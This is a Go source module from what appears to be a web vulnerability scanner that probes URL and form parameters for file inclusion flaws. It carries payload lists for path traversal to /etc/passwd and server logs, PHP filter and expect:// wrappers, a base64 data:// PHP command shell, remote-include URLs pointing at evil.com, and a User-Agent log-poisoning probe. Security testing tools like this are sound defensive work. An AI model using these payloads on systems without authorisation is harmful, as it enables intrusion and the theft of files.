package modules

import (
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// lfiPayload groups a file inclusion test vector.
type lfiPayload struct {
	Payload string
	Markers []string
	Label   string
}

// LFI payloads — local file inclusion via path traversal + PHP wrappers.
var lfiPayloads = []lfiPayload{
	// Classic /etc/passwd
	{"../../../../etc/passwd", []string{"root:x:", "nobody:x:", "/bin/bash"}, "/etc/passwd (classic traversal)"},
	{"../../../etc/passwd", []string{"root:x:", "nobody:x:"}, "/etc/passwd (short traverse)"},
	{"..%2F..%2F..%2Fetc%2Fpasswd", []string{"root:x:"}, "/etc/passwd (URL encoded)"},
	{"..%252F..%252F..%252Fetc%252Fpasswd", []string{"root:x:"}, "/etc/passwd (double URL encode)"},
	{"....//....//....//etc/passwd", []string{"root:x:"}, "/etc/passwd (....// bypass)"},
	// Windows
	{"../../../../windows/win.ini", []string{"[fonts]", "[extensions]"}, "Windows win.ini"},
	{"..\\..\\..\\..\\windows\\win.ini", []string{"[fonts]"}, "Windows win.ini (backslash)"},
	// PHP wrappers
	{"php://filter/convert.base64-encode/resource=index.php", []string{"PD9waHA", "<?php", "<?="}, "PHP filter wrapper (base64 index.php)"},
	{"php://filter/read=convert.base64-encode/resource=index", []string{"PD9waHA", "<?php"}, "PHP filter wrapper (no ext)"},
	{"php://filter/convert.base64-encode/resource=config.php", []string{"PD9waHA"}, "PHP filter wrapper (config.php)"},
	{"php://filter/convert.base64-encode/resource=/etc/passwd", []string{"cm9vdD", "root"}, "PHP filter wrapper (/etc/passwd)"},
	{"php://filter/convert.iconv.utf-8.utf-16/resource=index.php", []string{}, "PHP filter — iconv chain"},
	{"php://input", []string{}, "php://input (raw POST data)"},
	{"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==", []string{"system", "cmd"}, "data:// URI scheme"},
	{"expect://id", []string{"uid=", "gid="}, "expect:// wrapper (if enabled)"},
}

// RFI payloads — include a URL from a remote server.
var rfiPayloads = []lfiPayload{
	{"http://evil.com/shell.txt", []string{}, "Remote file include (http)"},
	{"https://evil.com/shell.txt", []string{}, "Remote file include (https)"},
	{"ftp://evil.com/shell.txt", []string{}, "Remote file include (ftp)"},
	{"hTTp://evil.com/shell.txt", []string{}, "Remote file include (mixed case)"},
	{"//evil.com/shell", []string{}, "Remote include (protocol-relative)"},
}

// ScanLFI tests URL parameters and forms for Local File Inclusion (LFI),
// Remote File Inclusion (RFI), and PHP wrapper injection vulnerabilities.
func ScanLFI(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	// ── URL parameters ─────────────────────────────────────────────────────
	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		if cfg.Verbose {
			output.Verbose("[lfi-get] param=%s", param)
		}

		baseline, _, err := core.DoGET(client, cfg, target.URL)
		if err != nil || baseline == "" {
			continue
		}

		// ── LFI ──────────────────────────────────────────────────────────
	LFILoop:
		for _, pl := range lfiPayloads {
			testURL, err := core.SetParam(target.URL, param, pl.Payload)
			if err != nil {
				continue
			}
			body, status, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}

			for _, marker := range pl.Markers {
				if strings.Contains(body, marker) && !strings.Contains(baseline, marker) {
					sev := "HIGH"
					if strings.HasPrefix(pl.Label, "php://") || strings.HasPrefix(pl.Label, "data://") {
						sev = "CRITICAL"
					}
					results = append(results, core.ScanResult{
						Type:      fmt.Sprintf("LFI (Local File Inclusion) [%s]", pl.Label),
						URL:       testURL,
						Method:    "GET",
						Parameter: param,
						Payload:   pl.Payload,
						Severity:  sev,
						Evidence:  fmt.Sprintf("marker %q in response — file content leaked (HTTP %d)", marker, status),
						Timestamp: time.Now(),
					})
					break LFILoop
				}
			}

			// Base64 PHP filter: check if response is valid base64 (longer than normal)
			if strings.HasPrefix(pl.Label, "PHP filter") && len(body) > len(baseline)+50 {
				// The body might contain base64-encoded file content — weak signal
				if !containsLFIResult(results, target.URL, param) {
					results = append(results, core.ScanResult{
						Type:      fmt.Sprintf("LFI — Potential Base64-Encoded Response [%s]", pl.Label),
						URL:       testURL,
						Method:    "GET",
						Parameter: param,
						Payload:   pl.Payload,
						Severity:  "MEDIUM",
						Evidence:  fmt.Sprintf("response grew by %d bytes — possible base64-encoded file returned", len(body)-len(baseline)),
						Timestamp: time.Now(),
					})
					output.SuspectInline("LFI-BASE64", "param=%s +%d bytes", param, len(body)-len(baseline))
				}
			}
		}

		// ── RFI ──────────────────────────────────────────────────────────
	RFILoop:
		for _, pl := range rfiPayloads {
			testURL, err := core.SetParam(target.URL, param, pl.Payload)
			if err != nil {
				continue
			}
			body, status, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}

			// RFI detection: look for error messages indicating the server tried to
			// connect to the injected URL
			rfiMarkers := []string{
				"failed to open stream",
				"HTTP request failed",
				"failed to connect",
				"php_network_getaddresses",
				"allow_url_include",
				"file_get_contents",
				"failed opening required",
				"include_path",
			}
			for _, marker := range rfiMarkers {
				if strings.Contains(strings.ToLower(body), strings.ToLower(marker)) {
					results = append(results, core.ScanResult{
						Type:      "RFI (Remote File Inclusion)",
						URL:       testURL,
						Method:    "GET",
						Parameter: param,
						Payload:   pl.Payload,
						Severity:  "CRITICAL",
						Evidence:  fmt.Sprintf("marker %q indicates server attempted to fetch remote resource (HTTP %d)", marker, status),
						Timestamp: time.Now(),
					})
					break RFILoop
				}
			}
		}
	}

	// ── Forms ──────────────────────────────────────────────────────────────
	for _, form := range target.Forms {
		// Fetch baseline once per form, not per input — avoids redundant requests.
		var baseline string
		var baseErr error
		if form.Method == "POST" {
			baseline, _, baseErr = core.DoPOST(client, cfg, form.Action, core.FormDefaults(form))
		} else {
			baseline, _, baseErr = core.DoGET(client, cfg, form.Action)
		}
		if baseErr != nil || baseline == "" {
			continue
		}
		for _, inp := range form.Inputs {
			// LFI in forms

		LFIFormLoop:
			for _, pl := range lfiPayloads {
				var body string
				var status int
				var err error
				if form.Method == "POST" {
					d := core.FormDefaults(form)
					d.Set(inp.Name, pl.Payload)
					body, status, err = core.DoPOST(client, cfg, form.Action, d)
				} else {
					u, _ := core.SetParam(form.Action, inp.Name, pl.Payload)
					body, status, err = core.DoGET(client, cfg, u)
				}
				if err != nil {
					continue
				}
				for _, marker := range pl.Markers {
					if strings.Contains(body, marker) && !strings.Contains(baseline, marker) {
						sev := "HIGH"
						if strings.HasPrefix(pl.Label, "php://") || strings.HasPrefix(pl.Label, "data://") {
							sev = "CRITICAL"
						}
						results = append(results, core.ScanResult{
							Type:      fmt.Sprintf("LFI via core.Form [%s]", pl.Label),
							URL:       form.Action,
							Method:    form.Method,
							Parameter: inp.Name,
							Payload:   pl.Payload,
							Severity:  sev,
							Evidence:  fmt.Sprintf("marker %q in response (HTTP %d)", marker, status),
							Timestamp: time.Now(),
						})
						break LFIFormLoop
					}
				}
			}
		}
	}

	// ── Log poisoning via User-Agent (if LFI is already suspected) ────────
	// This is a speculative check — we inject into User-Agent and then check
	// if the LFI payload shows our User-Agent string in the response.
	if cfg.LFI && len(results) > 0 {
		lfiLogPoisonProbe(client, cfg, target, &results)
	}

	return results
}

// lfiLogPoisonProbe injects a marker into the User-Agent header and then checks
// if any LFI-vulnerable parameter reflects it back (indicating the User-Agent
// was written to a log file which was then included).
func lfiLogPoisonProbe(client *http.Client, cfg *core.Config, target core.CrawlResult, results *[]core.ScanResult) {
	poisonMarker := "SXSC_LOG_POISON_MARKER_" + fmt.Sprintf("%d", time.Now().UnixNano()%999999)

	// First, send a request with the poisoned User-Agent to write to logs
	poisonReq, err := http.NewRequest("GET", target.URL, nil)
	if err != nil {
		return
	}
	core.ApplyHeaders(poisonReq, cfg)
	poisonReq.Header.Set("User-Agent", poisonMarker)
	if resp, err := client.Do(poisonReq); err == nil {
		io.ReadAll(resp.Body) //nolint:errcheck
		resp.Body.Close()
	}

	// Now check if any of the already-found LFI endpoints include our marker
	// We test using a path like /var/log/nginx/access.log or /var/log/apache2/access.log
	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	}

	logPaths := []string{
		"../../../../var/log/nginx/access.log",
		"../../../../var/log/apache2/access.log",
		"../../../../var/log/apache/access.log",
		"../../../../var/log/httpd/access_log",
		"../../../var/log/nginx/access.log",
		"php://filter/convert.base64-encode/resource=/var/log/nginx/access.log",
	}

	for param := range params {
		for _, logPath := range logPaths {
			testURL, _ := core.SetParam(target.URL, param, logPath)
			body, _, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}
			if strings.Contains(body, poisonMarker) {
				*results = append(*results, core.ScanResult{
					Type:      "LFI — Log File Poisoning (via User-Agent)",
					URL:       testURL,
					Method:    "GET",
					Parameter: param,
					Payload:   logPath + " | UA:" + poisonMarker,
					Severity:  "CRITICAL",
					Evidence:  fmt.Sprintf("Injected User-Agent %q found in %s — log poisoning to RCE possible", poisonMarker, logPath),
					Timestamp: time.Now(),
				})
				return
			}
		}
	}
}

func containsLFIResult(results []core.ScanResult, rawURL, param string) bool {
	want := core.StripQuery(rawURL)
	for _, r := range results {
		if r.Parameter == param && core.StripQuery(r.URL) == want && strings.HasPrefix(r.Type, "LFI") {
			return true
		}
	}
	return false
}
